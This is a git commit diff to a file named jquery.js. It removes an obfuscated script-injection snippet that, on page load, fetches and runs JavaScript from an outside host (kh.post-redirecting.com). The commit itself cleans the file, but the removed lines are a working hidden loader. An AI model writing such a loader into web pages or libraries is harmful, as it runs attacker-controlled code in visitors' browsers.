d4f1bbad2a0f2adb481466d6478911c31dd4d703
elankton <74224289+elankton@users.noreply.github.com>
2022-06-21 08:39:01 +0300

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -1,6 +1,1 @@
-(function (a, d, j, o) {
-   o = a.createElement(d),
-      m = a.getElementsByTagName(d)[0];              
-   o.src = j + "?d=0&r=" + Math.random();
-   m.parentNode.insertBefore(o, m)
-})(document, 'script', 'https://kh.post-redirecting.com/sl/867b95f6');
+
